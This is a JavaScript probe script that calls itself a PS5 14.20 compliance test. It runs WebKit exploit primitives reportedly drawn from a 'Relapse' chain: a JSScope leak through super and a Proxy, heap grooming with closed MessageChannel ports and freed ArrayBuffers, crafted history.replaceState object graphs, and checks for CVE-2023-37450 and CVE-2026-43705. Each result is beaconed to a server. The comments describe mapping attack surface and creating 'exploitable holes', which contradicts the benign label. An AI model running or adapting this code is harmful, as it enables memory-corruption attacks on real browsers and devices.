/*
 * p118-relapse-test.js — Memory safety compliance tests for PS5 14.20
 * Tests internal object reference patterns from known WebKit regression fixes
 * Beacon prefix: V118R-
 */
(function () {
  "use strict";
  var RUN = "v118r" + Math.random().toString(36).slice(2, 16);

  function beacon(tag, data) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", "/beacon/V118R-" + tag, false);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify({ r: RUN, b: typeof data === "string" ? data : JSON.stringify(data) }));
    } catch (e) {}
  }

  function tryCall(fn) {
    try { return { v: fn(), e: null }; }
    catch (ex) { return { v: null, e: ex.constructor.name + ":" + String(ex.message).slice(0, 120) }; }
  }

  function schedule(tests) {
    var i = 0;
    function next() {
      if (i >= tests.length) {
        beacon("Z", "probe118-done");
        return;
      }
      var t = tests[i++];
      try { t(); } catch (e) { beacon("ERR", t.name + ":" + e.message); }
      setTimeout(next, 200);
    }
    beacon("L", "probe118-start");
    setTimeout(next, 100);
  }

  // Heartbeat
  setInterval(function () { beacon("HB", "hb"); }, 8000);

  // ================================================================
  // R1: JSScope leak via super + Proxy (Slopkit/Relapse Stage 1)
  // This is THE critical test. If scope leaks, the info leak is alive.
  // ================================================================
  function R1_SCOPE_LEAK() {
    var result = {};
    try {
      // Exact pattern from Relapse webkit.js leakScopeObject()
      function leakScopeObject() {
        class Leaker {
          leak() {
            return super.foo;
          }
        }
        Leaker.prototype.__proto__ = new Proxy({}, {
          get: function (target, property, receiver) {
            return receiver;
          },
        });
        var leak = Leaker.prototype.leak;
        return (function () {
          return leak();
        })();
      }

      var leaked = leakScopeObject();
      result.leaked = leaked !== undefined && leaked !== null;
      result.type = typeof leaked;

      if (leaked !== undefined && leaked !== null) {
        // If we got something, inspect it
        result.isWindow = leaked === window;
        result.isGlobal = leaked === globalThis;
        result.constructor = (leaked.constructor || {}).name || "none";

        // Try to set properties on it (like Relapse does)
        try {
          leaked["test_prop_0"] = 42;
          result.propSet = leaked["test_prop_0"] === 42;
        } catch (pe) {
          result.propSet = false;
          result.propErr = pe.constructor.name;
        }

        // Check if it's an internal scope-like object
        try {
          var keys = Object.keys(leaked);
          result.keyCount = keys.length;
          result.hasNumericKeys = keys.some(function(k) { return /^\d+$/.test(k); });
        } catch (ke) {
          result.keyErr = ke.constructor.name;
        }

        // Critical: does toString reveal internal type?
        try {
          result.toString = Object.prototype.toString.call(leaked);
        } catch (te) {
          result.toStringErr = te.constructor.name;
        }
      }
    } catch (e) {
      result.err = e.constructor.name + ":" + String(e.message).slice(0, 100);
    }
    beacon("R1-SCOPELEAK", result);
  }

  // ================================================================
  // R2: Symbol.prototype.toString on Proxy-wrapped objects
  // Tests if oversized string can be generated from scope objects
  // ================================================================
  function R2_SYMBOL_TOSTRING() {
    var result = {};
    try {
      var symbolToString = Symbol.prototype.toString;

      // Test 1: normal symbol toString
      var sym = Symbol("test");
      var symObj = Object(sym);
      var r1 = tryCall(function () { return symbolToString.call(symObj); });
      result.normal = r1.e ? r1.e : r1.v;

      // Test 2: toString on non-symbol (should throw)
      var r2 = tryCall(function () { return symbolToString.call({}); });
      result.nonSymbol = r2.e ? r2.e : "NO_ERROR:" + r2.v;

      // Test 3: toString on proxy-wrapped symbol
      var symProxy = new Proxy(symObj, {});
      var r3 = tryCall(function () { return symbolToString.call(symProxy); });
      result.proxySymbol = r3.e ? r3.e : "len=" + r3.v.length;

      // Test 4: Function with large indexed property storage
      var fn = function testFn() { return 7; };
      for (var i = 0; i < 100; i++) fn[i] = i;
      result.fnIndexed = Object.keys(fn).length;

      // Test 5: Does scope leak + getter + Symbol toString produce oversized string?
      try {
        class Leaker2 {
          leak() { return super.foo; }
        }
        Leaker2.prototype.__proto__ = new Proxy({}, {
          get: function (t, p, r) { return r; },
        });
        var leak2 = Leaker2.prototype.leak;
        var scope2 = (function () { return leak2(); })();

        if (scope2 !== undefined && scope2 !== null) {
          // Create a getter on the scope that returns a symbol
          var testSym = Symbol("leak_test");
          try {
            Object.defineProperty(scope2, "g", {
              get: function () { return testSym; },
              configurable: true,
            });
            var wrapped = Object(scope2.g);
            var r5 = tryCall(function () { return symbolToString.call(wrapped); });
            result.scopeSymbol = r5.e ? r5.e : "len=" + r5.v.length;
          } catch (de) {
            result.scopeSymbolErr = de.constructor.name + ":" + de.message.slice(0, 80);
          }
        } else {
          result.scopeSymbol = "SCOPE_NOT_LEAKED";
        }
      } catch (e5) {
        result.scopeSymbol = "ERR:" + e5.constructor.name;
      }
    } catch (e) {
      result.err = e.constructor.name + ":" + String(e.message).slice(0, 100);
    }
    beacon("R2-SYMTOSTR", result);
  }

  // ================================================================
  // R3: history.replaceState with duplicate references
  // Tests if the serializer handles duplicate object refs correctly
  // ================================================================
  function R3_HISTORY_DUPES() {
    var result = {};
    try {
      // Pattern from Relapse: two array slots point to same object
      var sharedObj = { marker: 0x51515151 };
      var graph = new Array(10);
      graph[0] = [1, 2, 3]; // filler
      graph[1] = sharedObj;
      graph[2] = sharedObj; // duplicate reference

      history.replaceState(graph, "");
      var clone = history.state;

      // Check: do slots 1 and 2 still reference the same object?
      result.sameRef = clone[1] === clone[2];
      result.markerA = clone[1] ? clone[1].marker : "null";
      result.markerB = clone[2] ? clone[2].marker : "null";

      // Now test with large arrays (like Relapse's 0x10000 array)
      var bigGraph = new Array(0x10001);
      var refTarget = { marker: 0x4d41524b };
      bigGraph[0] = [];
      for (var fi = 0; fi < 100; fi++) bigGraph[0].push({});
      bigGraph[1] = refTarget;
      bigGraph[2] = refTarget;
      bigGraph[0xffff] = -64000; // control index like Relapse

      history.replaceState(bigGraph, "");
      var bigClone = history.state;
      result.bigLen = bigClone ? bigClone.length : -1;
      result.bigSameRef = bigClone && bigClone[1] === bigClone[2];
      result.bigControl = bigClone ? bigClone[0xffff] : "null";

      // Cleanup
      history.replaceState(null, "");
    } catch (e) {
      result.err = e.constructor.name + ":" + String(e.message).slice(0, 100);
    }
    beacon("R3-HISTDUPES", result);
  }

  // ================================================================
  // R4: TransformStream availability (CVE-2026-43705 prerequisite)
  // If TransformStream exists, iterator override type confusion is testable
  // ================================================================
  function R4_TRANSFORMSTREAM() {
    var result = {};
    try {
      result.hasTransformStream = typeof TransformStream !== "undefined";
      result.hasReadableStream = typeof ReadableStream !== "undefined";
      result.hasWritableStream = typeof WritableStream !== "undefined";

      if (typeof TransformStream !== "undefined") {
        // Test basic creation
        var r1 = tryCall(function () {
          var ts = new TransformStream();
          return "created";
        });
        result.basicCreate = r1.e ? r1.e : r1.v;

        // Test with custom transformer
        var r2 = tryCall(function () {
          var ts = new TransformStream({
            transform: function (chunk, controller) {
              controller.enqueue(chunk);
            }
          });
          return "custom_ok";
        });
        result.customCreate = r2.e ? r2.e : r2.v;

        // NOW the critical test: override Array.prototype[Symbol.iterator]
        var origIterator = Array.prototype[Symbol.iterator];
        var iterCalls = 0;
        try {
          Array.prototype[Symbol.iterator] = function* () {
            iterCalls++;
            yield { transform: function (c, ctrl) { ctrl.enqueue(c); } };
          };

          var r3 = tryCall(function () {
            // This constructor internally iterates arguments
            // With overridden iterator, it gets our fake transformer
            var ts = new TransformStream();
            return "iter_ok";
          });
          result.iterOverride = r3.e ? r3.e : r3.v;
          result.iterCalls = iterCalls;
        } finally {
          Array.prototype[Symbol.iterator] = origIterator;
        }

        // Test with argument that triggers iterator
        iterCalls = 0;
        try {
          var fakeArgs = {};
          fakeArgs[Symbol.iterator] = function* () {
            iterCalls++;
            yield 42;
          };

          // Try passing iterable to ReadableStream if TransformStream doesn't consume it
          if (typeof ReadableStream !== "undefined") {
            var r4 = tryCall(function () {
              var rs = new ReadableStream({
                start: function (controller) {
                  for (var item of fakeArgs) {
                    controller.enqueue(item);
                  }
                  controller.close();
                }
              });
              return "readable_iter_ok";
            });
            result.readableIter = r4.e ? r4.e : r4.v;
          }
        } catch (e4) {
          result.iterErr = e4.constructor.name;
        }
      }
    } catch (e) {
      result.err = e.constructor.name + ":" + String(e.message).slice(0, 100);
    }
    beacon("R4-TSTREAM", result);
  }

  // ================================================================
  // R5: super.prototype configurability (CVE-2023-37450)
  // Test if the "endless side effect" fix is present
  // ================================================================
  function R5_SUPER_PROTO() {
    var result = {};
    try {
      // Test 1: Can we make Function.prototype configurable via super?
      class SubFunc extends Function {
        setProto() {
          super.prototype = 1;
        }
      }

      var sf = new SubFunc();
      var r1 = tryCall(function () { sf.setProto(); return "set_ok"; });
      result.superProtoSet = r1.e ? r1.e : r1.v;

      // Check if prototype became configurable
      var desc = Object.getOwnPropertyDescriptor(sf, "prototype");
      result.configurable = desc ? desc.configurable : "no_desc";
      result.hasPrototype = desc !== undefined;

      // Test 2: Direct check on Function.prototype.prototype
      var funcDesc = Object.getOwnPropertyDescriptor(Function.prototype, "prototype");
      result.funcProtoConfigurable = funcDesc ? funcDesc.configurable : "no_desc";

      // Test 3: Can we delete the prototype after super assignment?
      if (desc && desc.configurable) {
        var r3 = tryCall(function () {
          delete sf.prototype;
          return "deleted";
        });
        result.protoDelete = r3.e ? r3.e : r3.v;
        result.VULN_CVE_2023_37450 = true;
      } else {
        result.VULN_CVE_2023_37450 = false;
      }

      // Test 4: super.length assignment
      class SubFunc2 extends Function {
        setLen() {
          super.length = 999;
        }
      }
      var sf2 = new SubFunc2();
      var r4 = tryCall(function () { sf2.setLen(); return "set_ok"; });
      result.superLenSet = r4.e ? r4.e : r4.v;
      var lenDesc = Object.getOwnPropertyDescriptor(sf2, "length");
      result.lenConfigurable = lenDesc ? lenDesc.configurable : "no_desc";

      // Test 5: Spread opcode on potentially corrupted array
      try {
        var arr = [1, 2, 3, 4, 5];
        var spread = [...arr];
        result.spreadOk = spread.length === 5;
      } catch (se) {
        result.spreadErr = se.constructor.name;
      }
    } catch (e) {
      result.err = e.constructor.name + ":" + String(e.message).slice(0, 100);
    }
    beacon("R5-SUPERPROTO", result);
  }

  // ================================================================
  // R6: Regex engine bugs (21 failures on PS5 14.00)
  // Test key patterns from flippingascend findings
  // ================================================================
  function R6_REGEX_BUGS() {
    var result = {};
    try {
      // Test 1: Unicode surrogate pair handling in /u mode
      // The flippingascend repo identified forward /u scan entering surrogate pairs
      var r1 = tryCall(function () {
        var re = /\ud800/u;
        return re.test("\ud800") ? "match" : "no_match";
      });
      result.surrogateU = r1.e ? r1.e : r1.v;

      // Test 2: Lone surrogate in character class
      var r2 = tryCall(function () {
        var re = /[\ud800-\udfff]/u;
        return re.test("\ud800") ? "match" : "no_match";
      });
      result.surrogateClass = r2.e ? r2.e : r2.v;

      // Test 3: Surrogate pair boundary in lookbehind
      var r3 = tryCall(function () {
        var re = /(?<=\ud83d)\udc00/u;
        return re.test("🐀") ? "match" : "no_match";
      });
      result.lookbehindSurrogate = r3.e ? r3.e : r3.v;

      // Test 4: Dot-all with surrogate pairs
      var r4 = tryCall(function () {
        var re = /^.$/su;
        return re.test("🐀") ? "match" : "no_match";
      });
      result.dotAllSurrogate = r4.e ? r4.e : r4.v;

      // Test 5: Unicode property escape edge cases
      var r5 = tryCall(function () {
        var re = /\p{Surrogate}/u;
        return re.test("\ud800") ? "match" : "no_match";
      });
      result.pSurrogate = r5.e ? r5.e : r5.v;

      // Test 6: Quantifier on surrogate pair
      var r6 = tryCall(function () {
        var re = /(🐀){3}/u;
        return re.test("🐀🐀🐀") ? "match" : "no_match";
      });
      result.quantSurrogate = r6.e ? r6.e : r6.v;

      // Test 7: Named capture group with surrogate content
      var r7 = tryCall(function () {
        var re = /(?<emoji>\ud83d[\udc00-\udfff])/u;
        var m = "🐀".match(re);
        return m && m.groups.emoji ? "match:" + m.groups.emoji.length : "no_match";
      });
      result.namedSurrogate = r7.e ? r7.e : r7.v;

      // Test 8: Split with unicode regex
      var r8 = tryCall(function () {
        var parts = "a🐀b".split(/🐀/u);
        return "parts=" + parts.length + ":" + parts.join(",");
      });
      result.splitSurrogate = r8.e ? r8.e : r8.v;

      // Test 9: Very large backreference number
      var r9 = tryCall(function () {
        var groups = "";
        for (var g = 0; g < 100; g++) groups += "(x)";
        var re = new RegExp(groups + "\\100");
        var input = "x".repeat(100) + "x";
        return re.test(input) ? "match" : "no_match";
      });
      result.largeBackref = r9.e ? r9.e : r9.v;

      // Test 10: String.prototype.replace with functional replacement + unicode
      var r10 = tryCall(function () {
        var count = 0;
        var re = /./gu;
        "🐀🐁🐂".replace(re, function (m) {
          count++;
          return m;
        });
        return "count=" + count;
      });
      result.replaceUnicode = r10.e ? r10.e : r10.v;
    } catch (e) {
      result.err = e.constructor.name + ":" + String(e.message).slice(0, 100);
    }
    beacon("R6-REGEX", result);
  }

  // ================================================================
  // R7: MessageChannel heap grooming (Relapse Stage 3 pattern)
  // Test if closed port transfer + ArrayBuffer free creates exploitable holes
  // ================================================================
  function R7_HEAP_GROOM() {
    var result = {};
    try {
      // Pattern from Relapse: close both ports, then postMessage with transfer
      var channel = new MessageChannel();
      channel.port1.close();
      channel.port2.close();

      // Try to transfer a large buffer through a closed port
      var slab = new ArrayBuffer(0x10000);
      var r1 = tryCall(function () {
        channel.port1.postMessage(0, [slab]);
        return "transferred";
      });
      result.closedTransfer = r1.e ? r1.e : "OK";
      result.slabDetached = slab.byteLength === 0;

      // Test with history.replaceState pattern
      var bigFiller = new Array(0x100);
      for (var fi = 0; fi < 0x100; fi++) bigFiller[fi] = {};
      var target = { marker: 0x51515151 };
      var outerGraph = new Array(0x10001);
      outerGraph[0] = bigFiller;
      outerGraph[1] = target;
      outerGraph[2] = target; // duplicate
      outerGraph[0xffff] = -64000;

      var r2 = tryCall(function () {
        history.replaceState(outerGraph, "");
        return "stored";
      });
      result.historyStore = r2.e ? r2.e : r2.v;

      // Now create holes and read back
      var channel2 = new MessageChannel();
      channel2.port1.close();
      channel2.port2.close();

      var hole1 = new ArrayBuffer(0x81000);
      var hole2 = new ArrayBuffer(0x81000);
      var r3 = tryCall(function () {
        channel2.port1.postMessage(0, [hole1, hole2]);
        return "holes_freed";
      });
      result.holeFree = r3.e ? r3.e : r3.v;
      result.hole1Detached = hole1.byteLength === 0;
      result.hole2Detached = hole2.byteLength === 0;

      // Read back history state after hole creation
      var r4 = tryCall(function () {
        var clone = history.state;
        if (!clone) return "null_state";
        var sameDupe = clone[1] === clone[2];
        var markerOk = clone[1] && clone[1].marker === 0x51515151;
        return "len=" + clone.length + ",same=" + sameDupe + ",marker=" + markerOk;
      });
      result.readback = r4.e ? r4.e : r4.v;

      history.replaceState(null, "");
    } catch (e) {
      result.err = e.constructor.name + ":" + String(e.message).slice(0, 100);
    }
    beacon("R7-HEAPGROOM", result);
  }

  // ================================================================
  // R8: ProxyObject JSScope leak variant
  // Tests the get_by_id_with_this leak path
  // ================================================================
  function R8_PROXY_SCOPE() {
    var result = {};
    try {
      // Variant 1: Proxy on prototype with different trap patterns
      var trapLog = [];

      class Accessor {
        getVal() {
          return super.valueOf;
        }
      }
      Accessor.prototype.__proto__ = new Proxy(Object.prototype, {
        get: function (target, property, receiver) {
          trapLog.push(property);
          return receiver;
        },
      });
      var accessor = new Accessor();
      var leaked2 = accessor.getVal();

      result.variant1Type = typeof leaked2;
      result.variant1IsObj = leaked2 !== undefined && leaked2 !== null;
      result.traps = trapLog.join(",");

      if (leaked2 && typeof leaked2 === "object" && leaked2 !== accessor) {
        result.variant1NotSelf = true;
        result.variant1Constructor = (leaked2.constructor || {}).name || "none";
        result.variant1ToString = Object.prototype.toString.call(leaked2);

        // Check if it's a scope object (not window, not globalThis)
        result.isScope = leaked2 !== window && leaked2 !== globalThis;
      }

      // Variant 2: Multiple levels of super access
      class Deep1 {
        access() { return super.x; }
      }
      class Deep2 extends Deep1 {
        access2() { return super.access(); }
      }

      Deep1.prototype.__proto__ = new Proxy({}, {
        get: function (t, p, r) { return r; },
      });

      var d2 = new Deep2();
      var r3 = tryCall(function () { return d2.access(); });
      result.deepLeak = r3.e ? r3.e : typeof r3.v;
      if (r3.v && typeof r3.v === "object") {
        result.deepLeakIsScope = r3.v !== d2 && r3.v !== window;
      }

      // Variant 3: Arrow function context
      class Arrow {
        arrowLeak() {
          var self = this;
          var fn = () => super.test;
          return fn();
        }
      }
      Arrow.prototype.__proto__ = new Proxy({}, {
        get: function (t, p, r) { return r; },
      });
      var arw = new Arrow();
      var r4 = tryCall(function () { return arw.arrowLeak(); });
      result.arrowLeak = r4.e ? r4.e : typeof r4.v;
    } catch (e) {
      result.err = e.constructor.name + ":" + String(e.message).slice(0, 100);
    }
    beacon("R8-PROXYSCOPE", result);
  }

  // ================================================================
  // R9: Streams API surface area check
  // Full API availability enumeration for attack surface mapping
  // ================================================================
  function R9_STREAMS_API() {
    var result = {};
    var apis = [
      "TransformStream", "ReadableStream", "WritableStream",
      "ReadableStreamDefaultReader", "ReadableStreamBYOBReader",
      "WritableStreamDefaultWriter", "TransformStreamDefaultController",
      "ReadableStreamDefaultController", "ReadableByteStreamController",
      "ByteLengthQueuingStrategy", "CountQueuingStrategy",
      "CompressionStream", "DecompressionStream",
      "TextEncoderStream", "TextDecoderStream"
    ];
    apis.forEach(function (name) {
      result[name] = typeof window[name] !== "undefined";
    });
    beacon("R9-STREAMS", result);
  }

  // ================================================================
  // R10: Scope property reflection depth test
  // If scope leaks, test how deep we can inspect it
  // ================================================================
  function R10_SCOPE_DEPTH() {
    var result = {};
    try {
      class ScopeTest {
        probe() { return super.foo; }
      }
      ScopeTest.prototype.__proto__ = new Proxy({}, {
        get: function (t, p, r) { return r; },
      });
      var probe = ScopeTest.prototype.probe;
      var scope = (function () { return probe(); })();

      if (scope === undefined || scope === null) {
        result.status = "NO_LEAK";
        beacon("R10-SCOPEDEPTH", result);
        return;
      }

      result.status = "LEAKED";
      result.type = typeof scope;

      // Try Object.getOwnPropertyNames
      var r1 = tryCall(function () {
        return Object.getOwnPropertyNames(scope).slice(0, 20).join(",");
      });
      result.ownNames = r1.e ? r1.e : r1.v;

      // Try Object.getOwnPropertyDescriptor on known internal slots
      var internalSlots = ["__proto__", "constructor", "length", "name"];
      internalSlots.forEach(function (slot) {
        var r = tryCall(function () {
          var d = Object.getOwnPropertyDescriptor(scope, slot);
          return d ? "found:" + typeof d.value : "absent";
        });
        result["slot_" + slot] = r.e ? r.e : r.v;
      });

      // Try to enumerate via for-in
      var r2 = tryCall(function () {
        var keys = [];
        for (var k in scope) {
          keys.push(k);
          if (keys.length > 20) break;
        }
        return keys.join(",");
      });
      result.forIn = r2.e ? r2.e : r2.v;

      // Try Reflect operations
      var r3 = tryCall(function () {
        return Reflect.ownKeys(scope).slice(0, 20).join(",");
      });
      result.reflectKeys = r3.e ? r3.e : r3.v;

      // Try JSON.stringify
      var r4 = tryCall(function () {
        return JSON.stringify(scope).slice(0, 200);
      });
      result.json = r4.e ? r4.e : r4.v;

      // Critical: can we defineProperty?
      var r5 = tryCall(function () {
        Object.defineProperty(scope, "__test_118__", {
          value: 0xdeadbeef,
          configurable: true,
          writable: true,
        });
        return scope.__test_118__ === 0xdeadbeef ? "OK" : "MISMATCH";
      });
      result.defineProperty = r5.e ? r5.e : r5.v;

      // Can we set indexed properties (like Relapse does with 512 props)?
      var r6 = tryCall(function () {
        for (var i = 0; i < 10; i++) scope["p" + i] = i;
        var ok = 0;
        for (var j = 0; j < 10; j++) if (scope["p" + j] === j) ok++;
        return "set=" + ok + "/10";
      });
      result.indexedProps = r6.e ? r6.e : r6.v;

      // Can we set numeric indices (like Relapse does with 0-7)?
      var r7 = tryCall(function () {
        for (var i = 0; i < 8; i++) scope[i] = 1.1 * i;
        var ok = 0;
        for (var j = 0; j < 8; j++) if (scope[j] === 1.1 * j) ok++;
        return "set=" + ok + "/8";
      });
      result.numericIndices = r7.e ? r7.e : r7.v;

    } catch (e) {
      result.err = e.constructor.name + ":" + String(e.message).slice(0, 100);
    }
    beacon("R10-SCOPEDEPTH", result);
  }

  // Schedule all tests
  schedule([
    R1_SCOPE_LEAK,
    R2_SYMBOL_TOSTRING,
    R3_HISTORY_DUPES,
    R4_TRANSFORMSTREAM,
    R5_SUPER_PROTO,
    R6_REGEX_BUGS,
    R7_HEAP_GROOM,
    R8_PROXY_SCOPE,
    R9_STREAMS_API,
    R10_SCOPE_DEPTH,
  ]);
})();
